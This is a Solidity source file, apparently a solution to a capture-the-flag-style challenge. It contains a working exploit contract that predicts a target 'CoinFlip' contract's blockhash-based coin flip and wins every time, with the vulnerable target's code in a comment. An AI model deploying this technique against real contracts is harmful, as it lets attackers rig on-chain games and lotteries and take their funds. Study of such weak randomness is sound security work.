// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Define an interface for the CoinFlip contract, grab the public function we need to interact with.
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

// Our contract used to exploit the CoinFlip contract.
contract CoinFlipHack {

    // State variables for storing the interface contract and the same factor constant.
    ICoinFlip private immutable target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Constructor 
    constructor(address _targetAddress) {
        target = ICoinFlip(_targetAddress);
    }

    // Function to call 10 times from our scripts directory.
    function flip() external {

        // Call this function to generate a guess (true or false).
        bool myGuess = _myGuess();

        // Forcing the guess from _myGuess to match for this function to return, so it will be correct every time!
        require(target.flip(myGuess), "Guess failed");
    }

    // Computes a guess for the side of the coin flip, in the exact say way as the original contract.
    // Since our calculation matches exactly, it should always match the guess of the CoinFlip's side anyway.
    function _myGuess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }
}

/*
// Target Contract
contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
*/